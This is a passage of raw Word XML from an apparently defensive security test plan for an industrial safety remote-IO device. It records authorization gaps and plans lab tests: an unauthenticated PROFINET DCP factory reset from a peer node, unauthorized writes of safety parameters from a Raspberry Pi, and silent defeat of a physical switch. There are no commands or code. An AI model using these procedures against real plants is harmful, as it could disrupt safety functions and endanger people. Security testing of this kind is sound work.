      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-4 (physical-barrier robustness — accurate, keep).</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Whether the switch can be moved without visible seal damage — the authorization barrier's silent-defeat question (cross-reference TC-RQ003-03 / TC-RQ002-05).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D54FDD2" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-5 (learning-phase — N/A conformance note).</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> No adaptive/ML function → the clause is </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Not Applicable</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; document with rationale per </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SM-5</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(Positive conformance statement, not a gap, not a test.)</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId284" w:history="1">
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="309A251A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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SL/conformance conclusion:</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-011 is </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>partially met, with authorization delegated.</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Device-side: </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no I&amp;A, no authorization enforcement</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (password dropped) → CR 1.1/1.2/2.1 </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>not met at component level</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; the only device-side controls are the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>physical-presence barrier</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (switch + power-cycle, for F-address/update only), the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>param-end write-gate</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, and the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>iParCRC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> integrity check</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. System-level: authorization is a </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>documented CCSC-2 delegation</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> to the locked-cabinet/restricted-network assumption. Two residual exposures: the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unauthenticated DCP factory-reset</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (G-2, test-to-confirm) and </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>silent physical-barrier defeat</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (G-4). The </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>learning-phase clause is N/A</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (documented). Net: the requirement holds </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>only under the environmental assumption</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; on the device alone it is </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>largely unenforced.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="248E18AF" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:pict w14:anchorId="148DE5BF">
          <v:rect id="_x0000_i1753" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A55BAED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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 2 — Methodological Test Planning (Scope-Corrected)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3563"/>
        <w:gridCol w:w="2202"/>
        <w:gridCol w:w="2294"/>
        <w:gridCol w:w="687"/>
      </w:tblGrid>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="40F892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F10FA2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F1854E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93D7CF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CAC4D7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 xml:space="preserve">Scientific </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E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EE3F21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SVV</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="237F2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37DD5" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E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F26E0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Confirm the </w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>IoT-Core write-path is blocked</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (attempt parameter writes via IoT-Core; expect read-only)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338B1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Positive verification (G-3); CR 2.1 read-only design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2A590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Requirements-based; OWASP ISTG-DES-AUTHZ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62ED2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SVV-1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="2F145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54204" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E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27C93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DCP factory-reset without authentication</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>: from a peer node, issue DCP Set/Reset (Mode 2, then 3/4 if present); observe whether comm-config is reset without credential or physical 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20D89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Proves/refutes G-2</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (authorization aspect)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E1D75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MITRE </w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>T0836</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Modify Parameter</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>; OWASP ISTG-DES-AUTHZ-001; NIST SP 800-115 §5.2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DF6D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SVV-4</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="7FF97F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5886E" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E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FA3F3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Fieldbus parameter write without device authentication</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">: from the Pi (not the legitimate PLC), attempt an acyclic write of safety </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iPars</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> during the param phase; observe whether any credential is demanded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E17FC3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Proves G-1</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (no device-side authorization)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F378D" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve">MITRE </w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>T0843/T0836</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>; NIST SP 800-115 §5.2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302A6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SVV-4</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="38F79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70D12" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E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D2C0E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Firmware-update access gate</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (received from RQ-005): attempt update </w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>outside</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> Update state; confirm rejection; then in Update state confirm acceptance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FD7A0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Validates the </w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>authorization</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> gate (EDR 3.10 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>authz</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> limb) — bounds G-1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FD3FD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OWASP </w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>ISTG-FW[UPDT]-AUTHZ-001</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>; NIST SP 800-115 §5.2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479F6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SVV-2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="7985C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7D52C" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>TS-5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9BE4B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Physical-barrier silent defeat</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (reuse TC-RQ003-03 / TC-RQ002-05): change switch without visible tamper; confirm change applies on reboot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61DC3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Proves</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> G-4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0857F" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>OWASP ISTG-PHY; EDR 3.11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E5A29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SVV-4</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve"> (PA-4)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1D6339B9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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Boundary notes:</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> TS-4 tests </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>who may update</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (authorization); the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>image-signature verification</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-005 (TC-RQ005-03)</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. TS-2 tests the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>authorization</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of DCP reset; the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>flooding</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> use of DCP is </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-010</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. Learning-phase generates </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no test</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (N/A per SM-5).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02AA3877" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Environment binding: TS-2/TS-3 active injection on the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Pi</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (eth0 OT-side; DCP via </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>pnio_dcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">); TS-1/TS-4 on the management path; TS-5 invasive physical (PA-4). Isolated Zone-B, PLC-monitored; attack tools on the Pi only. </w:t>
      </w:r>
      <w:hyperlink r:id="rId285" w:history="1">
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ifmworld</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>-m...epoint.com]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00D73D4E">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId286" w:history="1">
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Security_T</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>rk_Kali_EN</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | Word]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5744E0EE" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:pict w14:anchorId="22B39912">
          <v:rect id="_x0000_i1754" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="0875F10B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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 3 — Two-Level Test Catalog (Scope-Corrected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FACF0AA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>Full entries for the decisive DCP-reset proof (TS-2 → G-2), the fieldbus-write authorization proof (TS-3 → G-1), and the IoT read-only confirmation (TS-1 → G-3). TS-4 (received update-gate) and TS-5 (physical) follow established templates / reuse TC-RQ003-03.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1899700B" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:pict w14:anchorId="5F04025B">
          <v:rect id="_x0000_i1755" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="516C1802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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ011-01 — IoT-Core Write-Path Blocked (Read-Only Confirmation)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AE1DF8A" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E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7712"/>
      </w:tblGrid>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="5ADAEF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4990AC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3FBA4D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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="5E1A5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249E0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8E308" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>TC-RQ011-01</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="22B27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1F64D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2C0FD" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>RQ-011 (EHSR 1.1.9) → CR 2.1 → Asset B</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00483B71" w14:paraId="2DA5F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EBC64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E126E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Tampering (unauthorized parameter write via IoT)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="204CD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94298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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E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CB3DC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SVV-1</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>Requirements-based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Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00483B71" w14:paraId="360866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04876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8AE03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Confirm the design intent that safety-relevant parameters </w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>cannot</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> be written via IoT-Core (read-only), so the IoT path is not an authorization bypass.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="27071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107EC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 xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
